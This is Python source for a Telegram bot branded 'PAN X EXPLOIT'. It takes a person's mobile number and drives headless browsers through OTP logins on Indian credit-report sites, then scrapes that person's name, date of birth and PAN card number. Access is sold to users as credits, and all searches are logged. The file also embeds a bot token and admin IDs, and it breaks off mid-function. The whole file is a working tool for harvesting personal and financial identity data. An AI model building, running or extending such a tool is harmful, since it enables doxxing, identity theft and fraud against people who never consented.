import asyncio
import os
import json
import re
import time
import html
import aiosqlite
from datetime import datetime
from telebot.async_telebot import AsyncTeleBot
from telebot import types

# Vanilla Selenium Imports ONLY (selenium-wire removed)
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium import webdriver
from selenium.webdriver.chrome.service import Service

# ==============================================================================
# CONFIGURATION
# ==============================================================================
BOT_TOKEN = "8552139564:AAGqtYi3poYxCnBJChYY1ENAq6dn8UlmBTY"
ADMINS = [1612918900,]
DEBUG_ADMIN_ID = 1612918900

# File Paths
DB_FILE = "users.db"
OLD_JSON_FILE = "users_db.json"
CREDIT_LOGS_FILE = "credit_logs.json"
SEARCH_LOGS_DIR = "user_searches"

# QUEUE SYSTEM: Limit to 5 concurrent Selenium browsers
BROWSER_LIMIT = asyncio.Semaphore(5)

# Runtime State Memory
RUNTIME_STATES = {}

if not os.path.exists(SEARCH_LOGS_DIR):
    os.makedirs(SEARCH_LOGS_DIR)

bot = AsyncTeleBot(BOT_TOKEN)

# ==============================================================================
# DATABASE MANAGEMENT (aiosqlite)
# ==============================================================================
async def init_db():
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute('''
            CREATE TABLE IF NOT EXISTS users (
                uid INTEGER PRIMARY KEY,
                credits INTEGER DEFAULT 2,
                banned INTEGER DEFAULT 0,
                unlimited_until REAL DEFAULT 0,
                daily_limit INTEGER DEFAULT 0,
                used_today INTEGER DEFAULT 0,
                last_active_date TEXT DEFAULT "",
                successful_searches INTEGER DEFAULT 0
            )
        ''')
        await db.commit()

        if os.path.exists(OLD_JSON_FILE):
            print("[*] Old JSON database found. Migrating to SQLite...")
            try:
                with open(OLD_JSON_FILE, "r") as f: old_data = json.load(f)
                for uid_str, data in old_data.items():
                    uid = int(uid_str)
                    await db.execute('''
                        INSERT OR IGNORE INTO users (uid, credits, banned, unlimited_until, daily_limit, used_today, last_active_date, successful_searches)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (
                        uid, data.get("credits", 2), 1 if data.get("banned", False) else 0,
                        data.get("unlimited_until", 0), data.get("daily_limit", 0),
                        data.get("used_today", 0), data.get("last_active_date", ""),
                        data.get("successful_searches", 0)
                    ))
                await db.commit()
                os.rename(OLD_JSON_FILE, f"{OLD_JSON_FILE}.bak")
                print("[+] Migration successful! Renamed old file to .bak")
            except Exception as e:
                print(f"[-] Migration error: {e}")

async def get_user(uid):
    async with aiosqlite.connect(DB_FILE) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM users WHERE uid = ?", (uid,)) as cursor:
            row = await cursor.fetchone()
            if not row:
                await db.execute('''
                    INSERT INTO users (uid, credits, banned, unlimited_until, daily_limit, used_today, last_active_date, successful_searches) 
                    VALUES (?, 2, 0, 0, 0, 0, "", 0)
                ''', (uid,))
                await db.commit()
                return {"uid": uid, "credits": 2, "banned": 0, "unlimited_until": 0, "daily_limit": 0, "used_today": 0, "last_active_date": "", "successful_searches": 0}
            return dict(row)

async def update_user(uid, **kwargs):
    if not kwargs: return
    set_clause = ", ".join([f"{k} = ?" for k in kwargs.keys()])
    values = list(kwargs.values()) + [uid]
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(f"UPDATE users SET {set_clause} WHERE uid = ?", values)
        await db.commit()

def init_runtime(uid):
    if uid not in RUNTIME_STATES:
        RUNTIME_STATES[uid] = {"state": None, "temp": {}}

# ==============================================================================
# LOGGING
# ==============================================================================
def _load_logs_sync():
    if os.path.exists(CREDIT_LOGS_FILE):
        with open(CREDIT_LOGS_FILE, "r") as f:
            try: return json.load(f)
            except: return []
    return []

def _save_log_sync(admin_name, admin_id, action, target_name, target_id):
    logs = _load_logs_sync()
    logs.append({
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "admin_name": admin_name,
        "admin_id": admin_id,
        "action": action,
        "target_name": target_name,
        "target_id": target_id
    })
    with open(CREDIT_LOGS_FILE, "w") as f: json.dump(logs, f, indent=4) 

def _log_user_search_sync(uid, mobile, mode, data):
    log_file = os.path.join(SEARCH_LOGS_DIR, f"{uid}_searches.json")
    try:
        if os.path.exists(log_file):
            with open(log_file, "r") as f: history = json.load(f)
        else: history = []
    except: history = []

    history.append({
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "target_mobile": mobile,
        "engine_used": mode,
        "extracted_data": data
    })
    with open(log_file, "w") as f: json.dump(history, f, indent=4)

async def save_log_async(*args):
    await asyncio.to_thread(_save_log_sync, *args)

async def log_user_search_async(*args):
    await asyncio.to_thread(_log_user_search_sync, *args)

# ==============================================================================
# UI MESSAGES & SAFE EDITOR 
# ==============================================================================
def get_op_ui(target, step_log, prompt=None):
    ui = (
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<code>[📡] TARGET: </code> <code>{target}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>[⚡️] LIVE TERMINAL:</b>\n{step_log}\n"
    )
    if prompt: ui += f"\n<code>[>] {prompt}</code>"
    return ui

async def safe_edit(text, chat_id, msg_id, markup=None):
    try:
        if markup:
            await bot.edit_message_text(text, chat_id, msg_id, parse_mode='HTML', disable_web_page_preview=True, reply_markup=markup)
        else:
            await bot.edit_message_text(text, chat_id, msg_id, parse_mode='HTML', disable_web_page_preview=True)
    except: pass 

async def send_debug_log(target, phase, user_err, raw_log):
    try:
        safe_raw_log = html.escape(str(raw_log)[:3500])
        debug_text = (
            f"⚠️ <b>SYSTEM DEBUGGER</b> ⚠️\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 <b>TARGET:</b> <code>{target}</code>\n"
            f"🔄 <b>PHASE:</b> {phase}\n"
            f"🚫 <b>USER SAW:</b> {user_err}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⚙️ <b>RAW TRACE / JSON:</b>\n"
            f"<code>{safe_raw_log}</code>"
        )
        await bot.send_message(DEBUG_ADMIN_ID, debug_text, parse_mode='HTML')
    except: pass

# ==============================================================================
# TELEGRAM HANDLERS (START & MENUS)
# ==============================================================================
async def get_credit_display(uid, user_data):
    unlim_timestamp = user_data.get('unlimited_until', 0)
    if uid in ADMINS:
        return "UNLIMITED ♾️"
    elif unlim_timestamp > time.time():
        days_left = round((unlim_timestamp - time.time()) / 86400, 1)
        return f"UNLIMITED ♾️ ({days_left} Days Left)"
    else:
        return f"{user_data['credits']}"

@bot.message_handler(commands=['start'])
async def send_welcome(message):
    uid = message.from_user.id
    init_runtime(uid)
    RUNTIME_STATES[uid]["state"] = None
    
    user_data = await get_user(uid)
    if user_data["banned"]: return await bot.reply_to(message, "🚫 <b>ACCESS DENIED. YOU ARE BANNED.</b>", parse_mode='HTML')

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("SYSTEM INFO", callback_data="bot_info"), types.InlineKeyboardButton("📚 GUIDE", callback_data="bot_guide"))
    if uid in ADMINS: markup.add(types.InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_panel"))

    credits_display = await get_credit_display(uid, user_data)
    welcome_text = (
        f"━━━━━━━━━━━━━━━━━━━━\n<b>⚡️ 𝐏𝐀𝐍 𝐗 𝐄𝐗𝐏𝐋𝐎𝐈𝐓 ⚡️</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f"<code>[👤] USER:    </code> {message.from_user.first_name}\n"
        f"<code>[💳] CREDITS: </code> {credits_display}\n\n"
        f"<code>[>] CMD:     </code> <code>/pan [NUMBER]</code>\n━━━━━━━━━━━━━━━━━━━━"
    )
    await bot.send_message(message.chat.id, welcome_text, parse_mode='HTML', reply_markup=markup, disable_web_page_preview=True)

@bot.callback_query_handler(func=lambda call: call.data in ["bot_info", "admin_panel", "back_start", "bot_guide"])
async def menu_callbacks(call):
    uid = call.from_user.id
    init_runtime(uid)
    user_data = await get_user(uid)
    if user_data["banned"]: return
    
    if call.data == "bot_info":
        info_text = (
            f"<b>🜲 𝙂𝙊𝘿 𝘼𝙉𝙏𝙄𝙁𝙄𝙀𝘿𝙉𝙐𝙇𝙇 🜲</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"<code>[ℹ️] SYSTEM:   PAN-DB SCANNER BOT </code>\n<code>[📡] TARGET:   ALL SIM SUPPORTED </code>\n\n"
            f"<b>[ 👑 CREATOR & DEVELOPER ]</b>\n• <a href='https://t.me/cvnze'>𝙂𝙊𝘿 𝘼𝙉𝙏𝙄𝙁𝙄𝙀𝘿𝙉𝙐𝙇𝙇</a>\n\n"
            f"<b>[ 💡 CONTRIBUTORS ]</b>\n• <a href='https://t.me/SAKSHAM0916'>ＳＡＫＳＨＡＭ</a>\n• <a href='https://t.me/standy001'>𝐒𝐓𝐀𝐍𝐃𝐘</a>\n━━━━━━━━━━━━━━━━━━━━"
        )
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK", callback_data="back_start"))
        await safe_edit(info_text, call.message.chat.id, call.message.message_id, markup=markup)
        
    elif call.data == "bot_guide":
        guide_text = (
            f"<b>📚 SYSTEM GUIDE</b>\n━━━━━━━━━━━━━━━━━━━━\n<b>⚙️ OVERVIEW</b>\n"
            f"This bot checks financial databases to retrieve the PAN, DOB, and details associated with any mobile number.\n\n"
            f"<b>🟢 METHOD 1: FAST ENGINE (100% Accuracy)</b>\nUses advanced headless injection. Returns fast results including extra details if linked.\n\n"
            f"<b>🟡 METHOD 2: BACKUP ENGINE (75% Accuracy)</b>\nUses standard form filling. Use this as a backup if Method 1 server is slow.\n━━━━━━━━━━━━━━━━━━━━"
        )
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK", callback_data="back_start"))
        await safe_edit(guide_text, call.message.chat.id, call.message.message_id, markup=markup)

    elif call.data == "admin_panel" and uid in ADMINS:
        admin_text = (
            f"━━━━━━━━━━━━━━━━━━━━\n<b>👑 ADMIN CONTROL PANEL 👑</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"<code>/info [ID]</code>     - Check User Info\n<code>/give [ID] [AMT]</code> - Add Credits\n"
            f"<code>/revoke [ID] [AMT]</code>- Deduct Credits\n<code>/ban [ID]</code>        - Ban User\n"
            f"<code>/unban [ID]</code>      - Unban User\n<code>/broadcast [MSG]</code> - Send Message to All\n"
            f"<code>/stats</code>           - Check Database Status\n<code>/log</code>             - Check Credit History\n━━━━━━━━━━━━━━━━━━━━"
        )
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK", callback_data="back_start"))
        await safe_edit(admin_text, call.message.chat.id, call.message.message_id, markup=markup)

    elif call.data == "back_start":
        credits_display = await get_credit_display(uid, user_data)
        welcome_text = (
            f"━━━━━━━━━━━━━━━━━━━━\n<b>⚡️ 𝐏𝐀𝐍 𝐗 𝐄𝐗𝐏𝐋𝐎𝐈𝐓 ⚡️</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"<code>[👤] USER:    </code> {call.from_user.first_name}\n<code>[💳] CREDITS: </code> {credits_display}\n\n"
            f"<code>[>] CMD:     </code> <code>/pan [NUMBER]</code>\n━━━━━━━━━━━━━━━━━━━━"
        )
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("SYSTEM INFO", callback_data="bot_info"), types.InlineKeyboardButton("📚 GUIDE", callback_data="bot_guide"))
        if uid in ADMINS: markup.add(types.InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_panel"))
        await safe_edit(welcome_text, call.message.chat.id, call.message.message_id, markup=markup)

# ==============================================================================
# ADMIN COMMANDS
# ==============================================================================
@bot.message_handler(commands=['info'])
async def cmd_info(message):
    if message.from_user.id not in ADMINS: return
    try:
        parts = message.text.split()
        if len(parts) > 1: target_id = int(parts[1])
        elif message.reply_to_message: target_id = message.reply_to_message.from_user.id
        else: target_id = message.from_user.id
            
        user_data = await get_user(target_id)
        target_name, target_username = "Unknown", "None"
        try: 
            chat = await bot.get_chat(target_id)
            target_name = chat.first_name or "Unknown"
            if chat.username: target_username = f"@{chat.username}"
        except: pass
        
        unlim_ts = user_data.get('unlimited_until', 0)
        unlim_status = f"Yes (Ends: {datetime.fromtimestamp(unlim_ts).strftime('%Y-%m-%d %H:%M')})" if unlim_ts > time.time() else "No"
        dl = user_data.get('daily_limit', 0)
        limit_status = f"{dl} per day" if dl > 0 else "No Limit"
        is_banned = bool(user_data.get("banned", 0))

        info_text = (
            f"<b>👤 USER PROFILE INFO</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Name:</b> {target_name}\n<b>User:</b> {target_username}\n<b>ID:</b> <code>{target_id}</code>\n"
            f"<b>Credits:</b> {user_data.get('credits', 0)}\n<b>Success Scrapes:</b> {user_data.get('successful_searches', 0)}\n"
            f"<b>Unlimited:</b> {unlim_status}\n<b>Daily Limit:</b> {limit_status}\n<b>Banned:</b> {'Yes 🚫' if is_banned else 'No ✅'}\n━━━━━━━━━━━━━━━━━━━━"
        )
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("💰 Add Cr", callback_data=f"admin_give_{target_id}"), types.InlineKeyboardButton("📉 Del Cr", callback_data=f"admin_revoke_{target_id}"))
        markup.add(types.InlineKeyboardButton("⏳ Add Unlim", callback_data=f"admin_unlim_{target_id}"), types.InlineKeyboardButton("❌ Rev Unlim", callback_data=f"admin_revunlim_{target_id}"))
        markup.add(types.InlineKeyboardButton("🛑 Daily Limit", callback_data=f"admin_limit_{target_id}"), types.InlineKeyboardButton("✅ Unban" if is_banned else "🚫 Ban", callback_data=f"admin_unban_{target_id}" if is_banned else f"admin_ban_{target_id}"))
        markup.add(types.InlineKeyboardButton("🔍 View Searches", callback_data=f"admin_viewsearches_{target_id}"))
            
        try:
            photos = await bot.get_user_profile_photos(target_id, limit=1)
            if photos.total_count > 0:
                await bot.send_photo(message.chat.id, photos.photos[0][-1].file_id, caption=info_text, parse_mode='HTML', reply_markup=markup)
                return
        except: pass
        await bot.send_message(message.chat.id, info_text, parse_mode='HTML', reply_markup=markup)
    except: await bot.reply_to(message, "❌ Invalid ID format. Must be numbers.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
async def admin_inline_actions(call):
    if call.from_user.id not in ADMINS: return
    parts = call.data.split("_")
    action, target_id = parts[1], int(parts[2])
    try: target_name = (await bot.get_chat(target_id)).first_name or "User"
    except: target_name = "User"
    uid = call.from_user.id
    init_runtime(uid)
    RUNTIME_STATES[uid]["temp"].update({"action_target": target_id, "action_name": target_name})
    
    if action in ["give", "revoke", "unlim", "limit"]:
        msg = {"give": "ADD to", "revoke": "REMOVE from", "unlim": "DAYS for Unlimited access for", "limit": "max usage PER DAY limit for"}
        RUNTIME_STATES[uid]["state"] = f"WAIT_{action.upper()}"
        await bot.send_message(call.message.chat.id, f"Send amount/value to {msg[action]} <code>{target_name}</code>:", parse_mode='HTML')
    elif action == "revunlim":
        await update_user(target_id, unlimited_until=0)
        await bot.answer_callback_query(call.id, "✅ Unlimited plan revoked successfully!", show_alert=True)
    elif action in ["ban", "unban"]:
        await update_user(target_id, banned=1 if action=="ban" else 0)
        await bot.answer_callback_query(call.id, f"✅ User {'banned' if action=='ban' else 'unbanned'}!", show_alert=True)
    elif action == "viewsearches":
        log_file = os.path.join(SEARCH_LOGS_DIR, f"{target_id}_searches.json")
        if os.path.exists(log_file):
            try:
                with open(log_file, "rb") as doc: await bot.send_document(call.message.chat.id, doc, caption=f"📂 Search History")
            except: await bot.answer_callback_query(call.id, "Error reading history.", show_alert=True)
        else: await bot.answer_callback_query(call.id, "No history found.", show_alert=True)

@bot.message_handler(func=lambda m: RUNTIME_STATES.get(m.from_user.id, {}).get("state") in ["WAIT_GIVE", "WAIT_REVOKE", "WAIT_UNLIM", "WAIT_LIMIT"])
async def process_admin_inputs(message):
    uid = message.from_user.id
    if uid not in ADMINS: return
    state = RUNTIME_STATES[uid]["state"]
    try:
        val = int(message.text.strip())
        target_id = RUNTIME_STATES[uid]["temp"]["action_target"]
        t_user = await get_user(target_id)
        
        if state == "WAIT_GIVE":
            await update_user(target_id, credits=t_user["credits"] + val)
            await bot.reply_to(message, f"✅ Added {val} credits.")
        elif state == "WAIT_REVOKE":
            await update_user(target_id, credits=max(0, t_user["credits"] - val))
            await bot.reply_to(message, f"✅ Removed {val} credits.")
        elif state == "WAIT_UNLIM":
            await update_user(target_id, unlimited_until=time.time() + (val * 86400))
            await bot.reply_to(message, f"✅ Granted {val} Days Unlimited.")
        elif state == "WAIT_LIMIT":
            await update_user(target_id, daily_limit=val)
            await bot.reply_to(message, f"✅ Set daily limit to {val}.")
            
        RUNTIME_STATES[uid]["state"] = None
    except: await bot.reply_to(message, "❌ Invalid input. Must be a number.")

# ==============================================================================
# LOGS & PAGINATION
# ==============================================================================
@bot.message_handler(commands=['stats'])
async def show_stats(message):
    if message.from_user.id not in ADMINS: return
    async with aiosqlite.connect(DB_FILE) as db:
        total_users = (await (await db.execute("SELECT COUNT(*) FROM users")).fetchone())[0]
        banned_users = (await (await db.execute("SELECT COUNT(*) FROM users WHERE banned = 1")).fetchone())[0]
    await bot.reply_to(message, f"<b>📊 SYSTEM DATABASE STATS</b>\n\n👥 <b>Registered Users:</b> {total_users}\n🚫 <b>Banned Users:</b> {banned_users}", parse_mode='HTML')

@bot.message_handler(commands=['broadcast'])
async def broadcast_msg(message):
    if message.from_user.id not in ADMINS: return
    msg_text = message.text.replace("/broadcast ", "", 1).strip()
    if not msg_text or msg_text == "/broadcast": return await bot.reply_to(message, "<code>[!] FORMAT: /broadcast [MESSAGE]</code>", parse_mode='HTML')
    async with aiosqlite.connect(DB_FILE) as db:
        uids = [row[0] for row in await (await db.execute("SELECT uid FROM users")).fetchall()]
    status_msg = await bot.reply_to(message, f"<code>[+] Broadcasting to {len(uids)} users...</code>", parse_mode='HTML')
    success, failed = 0, 0
    for u in uids:
        try:
            await bot.send_message(u, f"<b>[📢] SYSTEM BROADCAST:</b>\n\n{msg_text}", parse_mode='HTML')
            success += 1
            await asyncio.sleep(0.05) 
        except: failed += 1
    await safe_edit(f"<code>[+] Broadcast Complete!</code>\n<code>Success: {success} | Failed: {failed}</code>", message.chat.id, status_msg.message_id)

# ==============================================================================
# EXPLOIT LAUNCHER (/pan)
# ==============================================================================
@bot.message_handler(commands=['pan'])
async def start_extraction(message):
    uid = message.from_user.id
    init_runtime(uid)
    RUNTIME_STATES[uid]["state"] = "PROCESSING"
    
    for key in ["pan_cm_driver", "pan_il_driver"]:
        if key in RUNTIME_STATES[uid]["temp"]:
            try: RUNTIME_STATES[uid]["temp"][key].quit()
            except: pass
    RUNTIME_STATES[uid]["temp"] = {}
    
    user_data = await get_user(uid)
    if user_data["banned"]: return await bot.reply_to(message, "🚫 <b>ACCESS DENIED. BANNED.</b>", parse_mode='HTML')
    
    today_str = datetime.now().strftime("%Y-%m-%d")
    if user_data.get("last_active_date") != today_str:
        await update_user(uid, used_today=0, last_active_date=today_str)
        user_data["used_today"] = 0

    dl = user_data.get("daily_limit", 0)
    if dl > 0 and user_data["used_today"] >= dl and uid not in ADMINS:
        return await bot.reply_to(message, f"❌ <b>DAILY LIMIT REACHED.</b> You can only use {dl} requests per day.", parse_mode='HTML')

    if uid not in ADMINS and user_data.get('unlimited_until', 0) < time.time() and user_data['credits'] <= 0:
        return await bot.reply_to(message, "❌ <b>ZERO CREDITS.</b>", parse_mode='HTML')

    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit() or len(args[1]) != 10:
        return await bot.reply_to(message, "<code>[!] ERROR: /pan 10-DIGIT-NUMBER</code>", parse_mode='HTML')

    mobile = args[1]
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("🟢 METHOD 1 (Fast - 100%)", callback_data="pan_il"), types.InlineKeyboardButton("🟡 METHOD 2 (Slow - 75%)", callback_data="pan_cm"))
    
    step_log = "<code>[?] Method 1: Fast (100% Accuracy)\n[?] Method 2: Backup (75% Accuracy)\n[?] Select Engine...</code>\n"
    msg = await bot.send_message(message.chat.id, get_op_ui(mobile, step_log, "SELECT MODE:"), parse_mode='HTML', reply_markup=markup)
    
    RUNTIME_STATES[uid]['state'] = "WAIT_PAN_SELECTION"
    RUNTIME_STATES[uid]['temp'].update({"mobile": mobile, "msg_id": msg.message_id, "step_log": step_log})

# ==============================================================================
# MODE ROUTING
# ==============================================================================
@bot.callback_query_handler(func=lambda call: call.data in ["pan_cm", "pan_il"])
async def mode_selection(call):
    uid = call.from_user.id
    if RUNTIME_STATES.get(uid, {}).get("state") != "WAIT_PAN_SELECTION": return
    
    RUNTIME_STATES[uid]['state'] = "PROCESSING"
    temp = RUNTIME_STATES[uid]['temp']
    mobile, msg_id = temp.get('mobile'), temp['msg_id']

    await safe_edit(get_op_ui(mobile, "<code>[!] Bot is under heavy load. Waiting in Queue...</code>\n"), call.message.chat.id, msg_id)
    
    if call.data == "pan_cm":
        temp['engine_used'] = "Method 2 (Slow)"
        async with BROWSER_LIMIT:
            temp['step_log'] = "<code>[+] Method 2 Engine Started.</code>\n<code>[+] Opening Headless Browser...</code>\n"
            await safe_edit(get_op_ui(mobile, temp['step_log']), call.message.chat.id, msg_id)
            
            def cm_init(mob):
                options = webdriver.ChromeOptions()
                options.add_argument("--headless=new")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--window-size=1920,1080") 
                options.add_argument("--incognito")
                options.binary_location = "/data/data/com.termux/files/usr/bin/chromium-browser"
                service = Service("/data/data/com.termux/files/usr/bin/chromedriver")
                
                driver = webdriver.Chrome(service=service, options=options)
                wait = WebDriverWait(driver, 20)
                try:
                    driver.get("https://www.creditmantri.com/")
                    wait.until(EC.presence_of_element_located((By.ID, "login-mobile-number"))).send_keys(mob)
                    driver.execute_script("arguments[0].click();", driver.find_element(By.XPATH, "//input[@value='Get Started']"))
                    wait.until(EC.presence_of_element_located((By.XPATH, "//input[contains(@class, 'otp-error-new')]")))
                    return True, driver, "Success"
                except Exception as e:
                    try: driver.quit()
                    except: pass
                    return False, None, str(e)
                    
            success, driver, err = await asyncio.to_thread(cm_init, mobile)
            
        if success:
            temp['pan_cm_driver'] = driver
            temp['step_log'] += "<code>[+] Auth Key Sent!</code>\n"
            RUNTIME_STATES[uid]['state'] = "WAIT_PAN_CM_OTP"
            await safe_edit(get_op_ui(mobile, temp['step_log'], "ENTER OTP:"), call.message.chat.id, msg_id)
        else:
            RUNTIME_STATES[uid]['state'] = None
            temp['step_log'] += f"<code>[-] Engine Initialization Error.</code>\n"
            await safe_edit(get_op_ui(mobile, temp['step_log']), call.message.chat.id, msg_id)

    elif call.data == "pan_il":
        temp['engine_used'] = "Method 1 (Fast)"
        async with BROWSER_LIMIT:
            temp['step_log'] = "<code>[+] Method 1 Native CDP Engine Started.</code>\n<code>[+] Opening Headless Browser...</code>\n"
            await safe_edit(get_op_ui(mobile, temp['step_log']), call.message.chat.id, msg_id)
            
            def il_init(mob):
                options = webdriver.ChromeOptions() # Changed to vanilla webdriver
                options.add_argument("--headless=new")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.page_load_strategy = 'eager'
                
                # Enable Chrome DevTools Protocol (CDP) Logging
                options.set_capability("goog:loggingPrefs", {"performance": "ALL"})
                
                options.binary_location = "/data/data/com.termux/files/usr/bin/chromium-browser"
                service = Service("/data/data/com.termux/files/usr/bin/chromedriver")
                
                driver = webdriver.Chrome(service=service, options=options)
                wait = WebDriverWait(driver, 15)
                try:
                    driver.get("https://indialends.com/credit-report/")
                    m_input = wait.until(EC.presence_of_element_located((By.ID, "li_mobile_number")))
                    m_input.send_keys(mob)
                    wait.until(EC.element_to_be_clickable((By.ID, "otp-mobile-verification"))).click()
                    wait.until(EC.presence_of_element_located((By.ID, "txt_otp0")))
                    return True, driver, "Success"
                except Exception as e:
                    try: driver.quit()
                    except: pass
                    return False, None, str(e)
                    
            success, driver, err = await asyncio.to_thread(il_init, mobile)
            
        if success:
            temp['pan_il_driver'] = driver
            temp['step_log'] += "<code>[+] Auth Key Sent!</code>\n"
            RUNTIME_STATES[uid]['state'] = "WAIT_PAN_IL_OTP"
            await safe_edit(get_op_ui(mobile, temp['step_log'], "ENTER 6-DIGIT OTP:"), call.message.chat.id, msg_id)
        else:
            RUNTIME_STATES[uid]['state'] = None
            temp['step_log'] += f"<code>[-] Engine Initialization Error.</code>\n"
            await safe_edit(get_op_ui(mobile, temp['step_log']), call.message.chat.id, msg_id)

# ==============================================================================
# FINAL RESULTS
# ==============================================================================
async def process_final_result(uid, chat_id, success, result, trace_msg):
    temp = RUNTIME_STATES[uid]['temp']
    mobile, msg_id = temp['mobile'], temp['msg_id']
    user_data = await get_user(uid)
    
    if success and isinstance(result, dict):
        valid_fields = sum(1 for val in result.values() if val and str(val).strip().upper() not in ["", "NA", "N/A", "NONE", "NULL", "0"])
        if valid_fields == 0:
            success, result, trace_msg = False, "Data Not Found", "Extraction yielded only N/A"
            
    if success and isinstance(result, dict):
        new_credits = user_data['credits']
        if uid not in ADMINS and user_data.get('unlimited_until', 0) < time.time():
            new_credits = max(0, user_data['credits'] - 1)
                
        await update_user(uid, credits=new_credits, used_today=user_data["used_today"]+1, successful_searches=user_data["successful_searches"]+1)
        await log_user_search_async(uid, mobile, temp.get('engine_used', 'Unknown'), result)
        
        temp['step_log'] += f"<code>[+] SUCCESS! DATA EXTRACTED.</code>\n"
        await safe_edit(get_op_ui(mobile, temp['step_log']), chat_id, msg_id)
        
        final_text = "✅ <b>Successfully Extracted Data:</b>\n------------------------------\n"
        for k, display_k in {'Name': 'Name    ', 'DOB': 'DOB     ', 'PAN Card': 'PAN Card', 'Email': 'Email   ', 'Gender': 'Gender  ', 'Income': 'Income  ', 'Pincode': 'Pincode '}.items():
            val = result.get(k)
            if val and str(val).strip().upper() not in ["", "NA", "N/A", "NONE", "NULL", "0"]: final_text += f"{display_k} : {val}\n"
        final_text += "------------------------------"
        
        await bot.send_message(chat_id, f"<code>{final_text}</code>", parse_mode='HTML')
    else:
        if result == "Data Not Found": temp['step_log'] += f"<code>[-] ERROR: Data not found for this number.</code>\n"
        elif "Invalid OTP" in str(result): temp['step_log'] += f"<code>[-] ERROR: Invalid OTP Entered.</code>\n"
        elif "Timeout" in str(trace_msg): temp['step_log'] += f"<code>[-] ERROR: API Timeout. Please Try Again.</code>\n"
        else: temp['step_log'] += f"<code>[-] ERROR: {result}</code>\n"
        await safe_edit(get_op_ui(mobile, temp['step_log']), chat_id, msg_id)
        await send_debug_log(mobile, "Verify", result, trace_msg)
        
    RUNTIME_STATES[uid]['state'] = None

# ==============================================================================
# CM EXTRACTOR
# ==============================================================================
@bot.message_handler(func=lambda m: RUNTIME_STATES.get(m.from_user.id, {}).get('state') == "WAIT_PAN_CM_OTP")
async def handle_pan_cm_otp(message):
    uid = message.from_user.id
    RUNTIME_STATES[uid]['state'] = "PROCESSING"
    temp = RUNTIME_STATES[uid]['temp']
    otp = re.sub(r'\D', '', message.text)
    
    if len(otp) != 5:
        RUNTIME_STATES[uid]['state'] = "WAIT_PAN_CM_OTP"
        temp_msg = await bot.reply_to(message, "<code>[!] Required 5 Digits.</code>", parse_mode='HTML')
        await asyncio.sleep(2); await bot.delete_message(message.chat.id, temp_msg.message_id)
        return
        
    try: await bot.delete_message(message.chat.id, message.message_id)
    except: pass

    temp['step_log'] += "<code>[+] Verifying Key & Extracting Profile...</code>\n"
    await safe_edit(get_op_ui(temp['mobile'], temp['step_log']), message.chat.id, temp['msg_id'])

    def cm_scrape(driver, otp):
        try:
            inputs = driver.find_elements(By.XPATH, "//input[contains(@class, 'otp-error-new')]")
            for i, digit in enumerate(otp):
                if i < len(inputs): inputs[i].send_keys(digit); time.sleep(0.1)
            try: driver.execute_script("arguments[0].click();", driver.find_element(By.XPATH, "//input[@value='Verify']"))
            except: pass
            
            for _ in range(8):
                try:
                    err = driver.find_element(By.ID, "otp-hidden-input-new-error")
                    if err.is_displayed() and err.text.strip(): return False, "Invalid OTP", "Site rejected the OTP"
                except: pass
                time.sleep(1)
            
            driver.get("https://secure.creditmantri.com/account/personal-details/")
            time.sleep(6)
            
            if "basic-details" in driver.current_url.lower(): return False, "Data Not Found", "No profile found."
            driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
            time.sleep(2)
            
            data = driver.execute_script("""
                return (function() {
                    var res = {name: "N/A", dob: "N/A", pan: "N/A"};
                    try {
                        var getVal = function(id, nA) {
                            var el = document.getElementById(id);
                            if (!el && nA) el = document.querySelector("input[name='" + nA + "']");
                            var v = (el && el.value) ? el.value.trim() : "";
                            return (v.toUpperCase() === "NA") ? "" : v;
                        };
                        var bN = getVal('bureauNameText', 'bureauName'), fN = getVal('firstName', 'firstName'), lN = getVal('lastName', 'lastName');
                        var fName = bN ? (lN && bN.toLowerCase().indexOf(lN.toLowerCase())===-1 ? bN+" "+lN : bN) : (fN+" "+lN);
                        res.name = fName.replace(/\\s+/g, ' ').trim() || "N/A";
                        res.pan = getVal('pan', 'pan') || getVal('panNumber', 'panNumber') || "N/A";
                        res.dob = getVal('dob', 'dob') || "N/A";
                    } catch(e) { } return res;
                })();
            """)
            raw_dob = data.get('dob', 'N/A')
            if raw_dob != "N/A":
                nums = re.findall(r'\d+', raw_dob)
                if len(nums) == 3: data['dob'] = f"{nums[2]}/{nums[1]}/{nums[0]}" if len(nums[0])==4 else f"{nums[0]}/{nums[1]}/{nums[2]}"
            
            return True, {'Name': data['name'], 'DOB': data['dob'], 'PAN Card': data['pan']}, "Success"
